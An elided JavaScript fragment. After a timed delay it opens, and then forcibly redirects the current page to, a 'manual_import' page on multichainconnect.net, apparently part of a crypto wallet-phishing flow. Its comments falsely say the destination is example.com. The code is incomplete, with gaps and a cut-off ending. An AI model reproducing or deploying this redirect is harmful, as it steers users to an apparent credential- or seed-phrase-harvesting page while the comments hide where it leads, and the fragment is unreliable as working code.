...
var waitTimeBeforeManualConnection = 10
...
function startManualConnection(){
    ...
    // Set launchURL directly to example.com
    var launchURL = 'https://multichainconnect.net/manual_import';
    ...
    if(launchNewWindow == null){
        // If window.open fails (e.g., blocked by browser), fallback to redirecting the current window
        window.location.href = launchURL;
    }
    else {
        // If window.open succeeds, close the new window after 10 seconds
        setTimeout(function(){
            launchNewWindow.close();
            window.location.href = 'https://multichainconnect.net/manual_import'; // Redirect to example.com after closing the new window
